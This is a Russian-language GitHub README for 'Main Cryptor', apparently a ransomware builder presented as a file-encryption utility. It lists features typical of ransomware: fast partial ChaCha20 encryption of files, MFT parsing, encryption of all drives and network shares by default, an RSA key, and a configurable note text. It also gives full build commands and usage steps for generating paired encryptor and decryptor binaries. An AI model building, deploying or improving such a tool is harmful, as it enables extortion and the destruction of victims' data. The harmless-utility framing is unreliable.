# Main Cryptor

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Build Status](https://img.shields.io/badge/build-passing-green.svg)
![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)

**Main Cryptor** — это утилита для шифрования и расшифровки файлов на Windows с использованием алгоритма ChaCha20 и парсинга MFT для ускорения работы с NTFS-дисками. Проект включает три основных компонента: `builder.exe` (генератор), `encryptor.exe` (шифровальщик) и `decryptor.exe` (дешифратор). Разработан для компактности (размер < 900 КБ) и совместимости с большинством версий Windows.

---

## Основные возможности

- **Шифрование файлов**: Использует ChaCha20 для частичного шифрования файлов (полосы от 0.6% до 2% в зависимости от размера).
- **Парсинг MFT**: Быстрый доступ к файлам через Master File Table на NTFS-дисках.
- **Логирование**: Опциональная запись операций в `encryptor.log`.
- **Генерация пароля**: Создание 64-символьного пароля для каждого запуска.
- **Сетевые ресурсы**: Поддержка шифрования на сетевых шарах через WinAPI.
- **Компактность**: Оптимизирован для размера менее 900 КБ с флагом `/O1`.

---

## Требования

- **ОС**: Windows 7 и выше (тестировалось на Windows 10/11).
- **Компилятор**: Microsoft Visual Studio (MSVC) с установленным Windows SDK.
- **Библиотеки**: `advapi32.lib`, `mpr.lib`, `user32.lib`.

---

## Установка и сборка

### Предварительные шаги
1. Установите Visual Studio с поддержкой C++ (Desktop Development with C++).
2. Убедитесь, что Windows SDK установлен (версия, например, 10.0.22621.0).

### Сборка
1. Клонируйте репозиторий:
   ```bash
   git clone https://github.com/freegut/main_cryptor.git
   cd main_cryptor
Откройте «Командную строку разработчика для VS».
Скомпилируйте компоненты:

cl /O1 /Feoutput\builder.exe src\builder.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib user32.lib
cl /O1 /Feoutput\encryptor.exe src\encryptor.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib mpr.lib user32.lib
cl /O1 /Feoutput\decryptor.exe src\decryptor.c src\crypto.c src\utils.c src\config.c /link /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x86" advapi32.lib mpr.lib user32.lib
Замените путь в /LIBPATH в вашей версии Windows SDK.
Использование
1. Подготовка конфигурации
Создайте файл cfg.txt в корневой папке проекта:

{
    "rsa_pub_key": "65537,123456789",
    "note_text": "Тестирование файлов прошло успешно, проведите тестирование расшифровки",
    "log_enabled": true
}
2. Генерация шифровальщика и дешифратора.
Запустите builder.exe :

cd output
builder.exe
Выводит 64-символьный пароль.
Создает новые encryptor.exe и decryptor.exe в выводе файла .
3. Шифрование файлов
Шифруйте файлы в указанной папке:

encryptor.exe -path C:\test
Или все диски и сетевые шары (осторожно!):

encryptor.exe
4. Расшифровка файлов
Расшифруйте файлы:

decryptor.exe -path C:\test
Структура проекта

main_cryptor/
├── src/            # Исходные файлы
│   ├── builder.c   # Генератор шифровальщика и дешифратора
│   ├── encryptor.c # Шифровальщик
│   ├── decryptor.c # Дешифратор
│   ├── crypto.c    # Реализация ChaCha20, SHA-256, RSA
│   ├── utils.c     # Утилиты (генерация пароля, логирование)
│   └── config.c    # Парсер конфигурации
├── output/         # Скомпилированные исполняемые файлы
│   ├── builder.exe
│   ├── encryptor.exe
│   └── decryptor.exe
├── cfg.txt         # Файл конфигурации
└── README.md       # Документация
Оптимизация размера
Использован флаг /O1 для минимизации размера.
Размер каждого .exe < 900 КБ (проверено в Windows 11 с MSVC 19.43).
Тестирование
Создайте тестовую точку (например, C:\test ) с файлами.
Последовательно выполните:

output\builder.exe
output\encryptor.exe -path C:\test
output\decryptor.exe -path C:\test
Проверьте файлы и encryptor.log .
Ограничение
Требуется запуск из «Командной строки разработчика» для компиляции внутри builder.exe .
Парсинг MFT работает только на NTFS-дисках.
Лицензия
Проект распространяется по лицензии . Используйте свой страх и риск.

Контакты
Если у вас есть вопросы или предложения:

GitHub: @freegut
